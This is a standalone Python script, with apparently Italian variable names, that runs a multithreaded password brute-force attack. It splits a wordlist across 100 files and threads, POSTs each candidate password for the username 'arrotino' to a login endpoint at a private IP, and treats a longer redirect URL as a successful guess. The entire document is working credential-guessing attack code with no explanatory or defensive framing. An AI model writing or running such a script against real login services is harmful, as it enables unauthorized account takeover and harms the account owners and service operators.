import requests
import threading
termina = False
class FileThread(threading.Thread):
    def __init__(self, filename):
        threading.Thread.__init__(self)
        self.filename = filename

    def run(self):
        global termina
        file = open(self.filename, "r")
        righe = file.readlines()
        for riga in righe:
            if termina == True:
                break
            else: 
                r = requests.post("http://192.168.1.133:8000", data={'username': 'arrotino', 'password': riga[:-1]})
                if(len(r.url)>28):
                    print("Trovata",riga)
                    termina = True
                    break


if __name__ == '__main__':
    filenames = ['Part1.txt', 'Part2.txt', 'Part3.txt', 'Part4.txt', 'Part5.txt', 'Part6.txt', 'Part7.txt', 'Part8.txt', 'Part9.txt', 'Part10.txt', 'Part11.txt', 'Part12.txt', 'Part13.txt', 'Part14.txt', 'Part15.txt', 'Part16.txt', 'Part17.txt', 'Part18.txt', 'Part19.txt', 'Part20.txt', 'Part21.txt', 'Part22.txt', 'Part23.txt', 'Part24.txt', 'Part25.txt', 'Part26.txt', 'Part27.txt', 'Part28.txt', 'Part29.txt', 'Part30.txt', 'Part31.txt', 'Part32.txt', 'Part33.txt', 'Part34.txt', 'Part35.txt', 'Part36.txt', 'Part37.txt', 'Part38.txt', 'Part39.txt', 'Part40.txt', 'Part41.txt', 'Part42.txt', 'Part43.txt', 'Part44.txt', 'Part45.txt', 'Part46.txt', 'Part47.txt', 'Part48.txt', 'Part49.txt', 'Part50.txt', 'Part51.txt', 'Part52.txt', 'Part53.txt', 'Part54.txt', 'Part55.txt', 'Part56.txt', 'Part57.txt', 'Part58.txt', 'Part59.txt', 'Part60.txt', 'Part61.txt', 'Part62.txt', 'Part63.txt', 'Part64.txt', 'Part65.txt', 'Part66.txt', 'Part67.txt', 'Part68.txt', 'Part69.txt', 'Part70.txt', 'Part71.txt', 'Part72.txt', 'Part73.txt', 'Part74.txt', 'Part75.txt', 'Part76.txt', 'Part77.txt', 'Part78.txt', 'Part79.txt', 'Part80.txt', 'Part81.txt', 'Part82.txt', 'Part83.txt', 'Part84.txt', 'Part85.txt', 'Part86.txt', 'Part87.txt', 'Part88.txt', 'Part89.txt', 'Part90.txt', 'Part91.txt', 'Part92.txt', 'Part93.txt', 'Part94.txt', 'Part95.txt', 'Part96.txt', 'Part97.txt', 'Part98.txt', 'Part99.txt', 'Part100.txt']
    threads = []
    for filename in filenames:
        thread = FileThread(filename)
        thread.start()
        threads.append(thread)
    print(threads)
    
    for thread in threads:
        thread.join()
